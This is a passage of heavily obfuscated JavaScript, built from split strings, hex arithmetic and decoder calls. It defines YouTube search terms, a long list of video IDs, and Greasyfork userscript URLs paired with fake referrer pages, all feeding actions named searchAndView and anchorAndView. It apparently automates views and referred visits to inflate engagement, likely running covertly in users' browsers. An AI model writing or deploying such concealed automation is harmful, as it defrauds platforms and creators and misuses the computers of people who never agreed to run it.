'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')['split'](',')), searchTerms['push'](['moomoo.io\x20' + 'zyenith']['repeatExte' + 'nd'](-0xb99 * -0x1 + -0x10a * 0x1 + -0xa85)), searchTerms['push'](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](0x14c2 + -0x159b + 0xe3)), searchTerms['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + 's,rm\x20bts,b' + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + 'ts,suga\x20bt' + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + V(0x5) + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + W(0x15, 'Eqq[') + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + 'terview')['split'](',')), searchTerms = searchTerms['flat'](-0xf * -0x1c3 + 0x1e03 + -0x386d);
const hookPlaylistPoints = [
    'eHpl-BjXo5' + '8',
    '-PgyODlV6V' + '8',
    'S9EkXX0QYD' + 'U',
    'WvcG1OKdHW' + 'o',
    'b6gOcEwtZ8' + 'U',
    'apdtzA0Dzf' + 'k',
    'YiukDwYv2K' + '4',
    'zK-6UH5R5X' + '8',
    'bIXqNjtsEf' + '4',
    '3l253rESkw' + 'Q',
    'u6RVZKcN9z' + 'Q',
    '6ImZdwpdwT' + 'A',
    '0qPB5ANSBK' + 'c',
    '92duH3cqn1' + 'M',
    'b5lKI78fw3' + 's',
    'zpCCPZfP8L' + 'I',
    'ES7oooakr-' + 'c',
    '2eWyJ8FBvQ' + '8',
    V(0x2) + 'Q',
    'JFcnGk0_u7' + 'o',
    'AP7d2Ghq6d' + 'U',
    'UizEAwrZAG' + 'I',
    '0FAi5-h8Hj' + '0',
    'CNqA6IYj17' + 'k',
    'tSiKyCpwnS' + 'Y',
    'OrglyeV5xP' + 'Y',
    'BXkB-g4eCc' + 's',
    'Y53CmmpbOJ' + 's',
    'sm5MLz_IrQ' + 'k',
    'EuciRU_Ska' + '0',
    'cCbDCTLyPc' + 'E',
    'Ox7Ng5T7bm' + 'c',
    'TXTaB-dQg-' + '0',
    '3jSWaWgr_A' + '0',
    'xT8nvuxCRB' + 'E',
    '3c4Ab9EmRg' + 'Y',
    '2kScgeNOpL' + '8',
    't22jhowMom' + 'c',
    'HbcDLgkmXL' + 's',
    'JsKZ41uTeg' + 'c',
    'dfU48FRgs0' + 'g',
    '3K9ILewnUk' + 'o',
    'QmKwnRiKhD' + 'k',
    'n3nVsWsL6I' + 'k',
    'noTs52D_Mw' + 'Y',
    'A0tDR4nTTK' + '0',
    '9eBwFca-B1' + '4',
    'moasU30H5l' + 'A',
    '_Mb8oQtSBW' + 'E',
    'TNGGOgwPtc' + 'M',
    '-pYA-gjkQ8' + 's',
    '5d-dB6tZZA' + 'o',
    '8H2AiOV0oE' + 'o',
    'mI7aiKDGde' + 'w',
    'D-IMDYrj35' + '4',
    'gKgFiEgghy' + 'g',
    'mjVwfjJ2nj' + 'k',
    '6auDBi-D2H' + 'M',
    'X89-SWNdIE' + 'k',
    'T5Pn4LhIwj' + 'M',
    'wVnKGSjY3i' + '8',
    'g11NJftxw1' + '4',
    '9zHirkfEKk' + 'k',
    'ZyGS_AMbIa' + '4',
    'yG6bwB17ZP' + 's',
    'aytHiLe0s6' + 'U',
    'cGe-Mpw_F1' + 'w',
    'eMK7xV_nxZ' + 'o',
    'epJ2MAKa1Y' + 'Q',
    '5BNbKKMUhE' + 'o',
    'oxpAvc6tDP' + '8',
    'jRcc-NIR2R' + 'I',
    '258btO4mFw' + '4',
    'pXjJAUvSbQ' + 'A',
    '63-irfPjh2' + 'c',
    'xbrDZAFf3Q' + 's',
    'MVHMtRlesU' + 'g',
    'zed05qfHMB' + 'I',
    'nkhkxKUHsY' + 'g',
    'n4cSAqR9H1' + 'Q',
    'gOUPndcj7z' + 'I',
    'n3HBTTDHoX' + '8',
    'XIgMFHPIXv' + '4',
    'oQHKMky-_K' + 'c',
    'zfDgTzZ2nh' + '0',
    '1PYettRo-D' + 'M',
    'jzuZuwF490' + '4',
    '2DAgWTlXae' + '8',
    'keouUYA5hI' + 'k',
    'F7i7wRlGCd' + 'c',
    'uToD2c0CdJ' + 'c',
    'Y8DzpdFZZ8' + '8',
    '-rrH657DAa' + 'o',
    'QTrEEWtDks' + '4',
    'TWTSnQDuad' + 'Y',
    'a0GUyvgnzg' + 'c',
    'eSReWZQyKd' + 'E',
    'D_5pMqdKSs' + '4',
    'm0ie8gHS00' + 'I',
    '6WosqMq9ej' + 'o',
    'i0afAOlon_' + '4',
    'j_fe6PfxW4' + 'Y',
    'GfPzi8SYr0' + 'w',
    'MSgZhNCwff' + 'M',
    'wxyBC_z6bI' + '8',
    'PkQpV-Fwhs' + 'k',
    'bVD6cWOVhN' + 'U',
    'mjZOpQlHbx' + 'M',
    'k_BXkcdbBO' + 'M',
    'X72oUsFV7q' + '0',
    'lONsILfq-W' + 'Y',
    'Bhe9PyM_s_' + 'Q',
    'Bhe9PyM_s_' + 'Q',
    'h4TBnDkX4y' + 'o',
    'PNBJyHEkfk' + '4',
    'L3iHS__ufc' + 'g',
    'm7aliUAwm_' + 'Y',
    'FuPVf85zMi' + 'w',
    'gtupAeNTDS' + 'M',
    'yyJ8zkckoB' + '8',
    'ZDTESiN1eS' + 'w',
    'Fo6x16DkoR' + 'o',
    'IAJqRxhVqO' + 'k',
    'KAgwII8TGj' + 'o',
    'o4tLCshmlb' + 'M',
    'dLj5fIupdA' + 'o',
    '_Xl_-b9P4U' + 'Q',
    'V3NxxpUUfW' + 'E',
    'J3ygeDEMnO' + 'w',
    'HcP_xmdwsl' + 'c',
    'M9g0h7px2_' + 'M',
    'b5WfUvcSgr' + 'U',
    'JGHnIshsoC' + 'E',
    'x2gfhCLHd9' + '4',
    'M5Fr8G0ma9' + 'o',
    '3sGeIBfFlC' + 'M',
    'k74y4KOJ2m' + '4',
    'pTHJB0S8E-' + 'U',
    'KaIrXJLfYP' + 'M',
    '0cisZkywhg' + 'Q',
    '0dVzItbl9E' + 'w',
    't0EqnhcSb1' + 's',
    'MuiXtvo1RY' + 'E',
    'Nj-3KC6knH' + 'w',
    'B19HbETNi5' + '8',
    'yKN_QkroH6' + 's',
    'U9ExFM1pji' + '0',
    'sONzDfjKhL' + '4',
    'n3Kj8zEfew' + 'U',
    'nXLGQ7QeoG' + 'Y',
    'OQFQiwiM-P' + 'Y',
    'UtPRpKRTtH' + 'U',
    'E56Myp0BzE' + 'E',
    '7DjOp_JM2Z' + 'w',
    'rNFLQFz_G1' + 'g',
    '1r2pKoVAdj' + 'M',
    'gm3eiv6UND' + 'M',
    'yOiROfjxzX' + 'o',
    'lt2AcxC_ap' + 'g',
    'bObEme2BDO' + 'E',
    '6Ut6HbJmW4' + 'w',
    'fUs0TtQQTo' + '0',
    '_phHS3FAgW' + 'Q',
    '1f8sU4l3dP' + '4',
    'HwTSLUd53K' + '8',
    'EpP2ymD_QG' + 'A',
    'TQ69QFqmbo' + 'I',
    'wA8BqUka_u' + '0',
    'bc8Ey-vuR5' + 'M',
    'PZ_uLi7ULl' + '0',
    'smu5FsnhwF' + '4',
    'dv1JluwoOb' + 'c',
    'nHotP0jbcv' + 'A',
    'iIjYNEmrVv' + 'M',
    'SeP-OZAiPb' + 'c',
    'v52PClvMFt' + 'k',
    '3loLqIPxTS' + '0',
    'jVu9mOzbSq' + 'U',
    '73SAN1vOrV' + 'k',
    'YLPxp4ntym' + 's',
    'YWXfelRk3b' + 'Q',
    'CsxlLMb6Uj' + 'o',
    'uafGOfwzpa' + 'Q',
    'XIr8qotHOI' + 'E',
    'EcoPCWC3Uh' + 'o',
    'AhOwyT8aIh' + 'g',
    W(0x3, ']cKF') + 's',
    'i08qNmssXe' + 'Q',
    'QrJIU09eD-' + 'g',
    'QvNNCQ-8Rp' + 'E',
    'k5gjnjDFAZ' + 's',
    'h_NQ3y1ek8' + 'U',
    'evPsJlNLy_' + '4',
    'qEPTydgwh4' + 's',
    'LB685ckhuf' + 'E',
    'Lj1EcSMGey' + '0',
    'OE19r7MIMW' + 'Q',
    'u8E3p0Vy-P' + 'Y',
    'f4a5OPFQa7' + 'k',
    'XDo7Q7yUEt' + 'k',
    'Vw_9zw0qHI' + 'c',
    'KGT5nbDsI_' + '8',
    'E008Eql59M' + 'Q',
    'wSOFdefX47' + 'A',
    '2xcv7q3QhR' + 'E',
    'hgfvmcBkc0' + '4',
    '0wP7csnX7k' + '4',
    'Xo0R8WiRSb' + '4',
    '8zNp8EOpGd' + '4',
    'sWYhIJZmoS' + 'E',
    'YdG8U1W-bX' + '0',
    'QeDsoSNml-' + 'c',
    'xW5q77El0x' + '8',
    'ZF14issJFE' + 'Y',
    'TRglEGLLKX' + 'o',
    'UE0SXc5k1e' + 'g',
    '6VY65D8f3D' + 'Q',
    'Iwxuob4fA8' + 'Q',
    'M4elJHCUIi' + 's',
    'GY9WWhO504' + 'k',
    'eErUSxmLDw' + '8',
    'ITQfAfzLj3' + 'I',
    'vbDrCL2FuL' + 'g',
    'KyQ_sUgtbK' + 'U',
    'lbEJcipUp8' + 'I',
    '2SqCn2LreN' + 'g',
    '1i-G2TUn41' + '0',
    's0ru6uK7vi' + '8',
    'gOxiE5UAAD' + 'w',
    'lx1rOOjekc' + '8',
    '5VYN2zA-Si' + 'k',
    'q9rLWEAzoo' + 'k',
    V(0x13) + 'g',
    'fMqRu_ON-D' + 'E',
    'GfvShU6Sy9' + 'A',
    'OHzOmi1b60' + 'Y',
    'D9oTUKT-_n' + 'A',
    '_BrT2PlUiw' + '0',
    'kuuI4LzKgm' + 'I',
    '78dymyg88r' + 'M',
    'mi0nGt2B-q' + 'o',
    'HaI7BjnwnO' + 'c',
    'xlAEOkIuy7' + 'Y',
    '3VmtckvTXl' + 'U',
    'ed7TWHKDr4' + 'E',
    '2LfTjyVtbf' + 'U',
    'STHlCkloyv' + 'E',
    '-BI_-6YnM6' + 'Y',
    'LSK_G1qCQw' + 'M',
    '4tzqIl6EKV' + 'k',
    '9DshU55EiV' + '8',
    'mBtaEI_6e8' + 's',
    '960lvuduwY' + 'w',
    'XWJH-6J5Ee' + 'g',
    'XLS4qmyCAX' + 'g',
    '8cJDYeRiLn' + 'k',
    'cCaIVrltHz' + 'w',
    '8X2fF4pgM0' + 'E',
    '6s8Xm4wylr' + '4',
    'eFceshvavn' + 'o',
    '2h4g7euqR-' + 'U',
    'ujiBqXnn92' + '8',
    'w9F2NST-9j' + 's',
    'w-oc7F5Mmy' + 'U',
    'UYrmqL3cOD' + 'U',
    '4QB59etj0I' + 'o',
    'MY9MTNgXcN' + 'o',
    'ISBmcKDS5C' + '8',
    'ogIb7A7tvW' + '0',
    '-L583IZF6s' + 'k',
    'NbeKQq29ZL' + '0',
    'SPplDxd74F' + 's',
    'MHGV8QmpAz' + 'k',
    'iWzezFWpU7' + 'A',
    'NNCQt1rXXE' + 'Y',
    'bcb_ZhJJK8' + 'g',
    '3KoZGQiY6N' + 'o',
    'aSaXQH8F1_' + 'A',
    'V5nMOhI62o' + 'w',
    'JvlPjRUdId' + '0',
    '2gQHuClLCb' + '0',
    '5e-qDy-uUJ' + 'E',
    'oE8vC0QEWU' + 'E',
    '7cQken99yu' + 'o',
    'pmzu080j7r' + 'I',
    'sVy9F4whP6' + 'o',
    'MJrkylk7iE' + 'c',
    'XYjsTxi6oE' + '8',
    'mKlMouB6tp' + '0',
    'o2yunZQley' + 'A',
    'oRryU9F9Lv' + 's',
    'uzzK-052H0' + 'c',
    'VSvA4rCe-4' + 'M',
    'XURH2u_0fM' + 'I',
    'yfpVL2g_tk' + 'o',
    'AuEEjQ8x9o' + 'w',
    'wWkviY8zBr' + 'c',
    'zt_eubHWhx' + 'c',
    'O_7_BGU3u_' + '0',
    'QFDKBxmOn3' + 'Y',
    'w6gccNWXXv' + 'g',
    'VdNJxbrqdX' + 's',
    'wbi5Dxebvn' + 'I',
    'XEFOREYrJg' + 'k',
    'I2rcRta7WJ' + '0',
    'OP5KGfXHX_' + 'A',
    'w2MUMbbwlm' + 'o',
    'X3bF0nd6kf' + 'w',
    'WDDAhASf9j' + 'w',
    'fRwcV8gjbc' + 'w',
    '7T63gaRThr' + '0',
    'zC8AWIwhbf' + 's',
    'JSkVE0n-ee' + 'o',
    'qiQA5pWWRt' + 'U',
    'QdXCjZtfXu' + 'c',
    'vlBji8TOax' + 'o',
    'pBx_5CbIcp' + 'o',
    'L1Oy5F6ZMO' + 'Q',
    'P0NjLaBed-' + 'E',
    'DR16C4-keB' + '0',
    'LGmpIpu9eD' + 'w',
    'rNkX_A4kBA' + 'Q',
    'QztVMjrEk4' + '0',
    'uOM6m6KL5d' + '4',
    'g-Aju8xrrO' + 'E',
    'DfkDbFk_x9' + '8',
    'Y4NLDaowD6' + 'I',
    'ALSZnqQTuJ' + 'o',
    'xUmB6BpZBE' + 'w',
    'SxNOcZ1s85' + '8',
    '-noeCjO416' + 'k',
    'taPJqXBI8V' + 'Y',
    'YxqbkMi1Is' + '4',
    'vnJTyve2r-' + '4',
    '44lRVYQ38E' + 'Q',
    'QOv1N1X5J-' + 'g',
    'jNjREs7ODT' + 'g',
    'U30ToJo3dd' + 'k',
    'rm7lNIIOQC' + 'Y',
    'mGU6sOPlYv' + 'c',
    '6pwxUXdt6T' + 'Q',
    '6MkJRee35a' + 'Q',
    'LVbf7U9WAI' + 'c',
    'gPbhFvEeJ3' + 'M',
    'LWXAxz0MiH' + 'A',
    'L0KQJqfwJJ' + 'Y',
    'GWr33_u0VK' + 'c',
    '4ud3ZPfWkH' + 's',
    'dxSrySC4XM' + 'c',
    'iIM2KZC69W' + '0',
    '8DuJ3BAwME' + 'o',
    'm3BAhe1wsl' + 'Y',
    '02U_3pAZxM' + '8',
    '0e7nidPa97' + 'g',
    'TixW__6Eer' + 'o',
    'q46W8MTRTC' + 'E',
    'Jdxp04Je1O' + 'w',
    'HfP4TO3gfN' + '0',
    '4dUJaeB0qL' + '8',
    'xnL-fRJ3RZ' + 'o',
    'yJbD0Df45u' + 'Q',
    '-pGw8RkSSB' + 'k',
    '7cy86Njsis' + 'M',
    'jbgqvxtauo' + '4',
    'N8M00JjSVI' + 'I',
    'MfR5q6Td3R' + 'c',
    'eHwcx94wcp' + 's',
    'olDgVFgAgP' + 'o',
    'eAAd5BmzXz' + 'M',
    'xgTjQ2sGXd' + '4',
    'ipny6JUbzw' + 's',
    'WOwQ0UxbRj' + '4',
    'h0PKFed2GB' + 's',
    'JxdOrgzq7Z' + '8',
    '-VgpSWWW-8' + 'w',
    '-ix4OizkAn' + 's',
    'd3CRE9y3YV' + 's',
    '4QZlfXxorJ' + 'o',
    'YlDpg8aCs5' + 'M',
    'Qe5WT22-AO' + '8',
    'b_rjBWmc1i' + 'Q',
    '9yjZpBq1XB' + 'E',
    'hPx-RiBKXt' + 'Q',
    'UMqLDhl8PX' + 'w',
    'DlJEt2KU33' + 'I',
    'BWeqoARup-' + 'Q',
    '2Dx76lD8Sc' + 'c',
    'j_nI6G3ZDi' + 'E',
    'zvcUYYN1sx' + 'w',
    'cWRkYo1S3L' + '4',
    'cWRkYo1S3L' + '4',
    'bxC_PN3SRv' + 'I',
    '94m93T_5JL' + 'M',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'bo9fTeXvSi' + 'A',
    'z6LqXiAK-8' + '0',
    '5tbOspjJ5f' + '0',
    'twQ6kKjtBk' + 'Y',
    'Ig17K38Fy0' + 'Y',
    'ZdlrVDwn_a' + '4',
    V(0xd) + 'g',
    'acAvMGQtln' + 'M',
    '8XkcbdSRdO' + '0',
    '0e3GPea1Ty' + 'g',
    'zxYjTTXc-J' + '8',
    W(0xb, '%U@t') + 'A',
    'plSyrHqUh7' + '8',
    V(0x9) + 'A',
    'lADBHDg-Jt' + 'A',
    'I2O7blSSzp' + 'I',
    'kd2KEHvK-q' + '8',
    'CbUjuwhQPK' + 's',
    'fb7T1v_VHp' + 'E',
    'SpeSpA3e56' + 'A',
    'RQdxHi4_Pv' + 'c',
    V(0x1) + 'w',
    'tUTCq3iiw_' + '4',
    'VDa5iGiPgG' + 's',
    'S-sJp1FfG7' + 'Q',
    'Hm1YFszJWb' + 'Q'
  ],
  GlobalActions = [
    searchAndView,
    anchorAndView,
    frontScreenActions,
    keyWatch
  ],
  wait = f => new Promise(h => setTimeout(h, f)),
  scriptTargets = [{
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + V(0x12),
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + V(0x17) + 'pts/405955' + '-web-secur' + 'ity',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
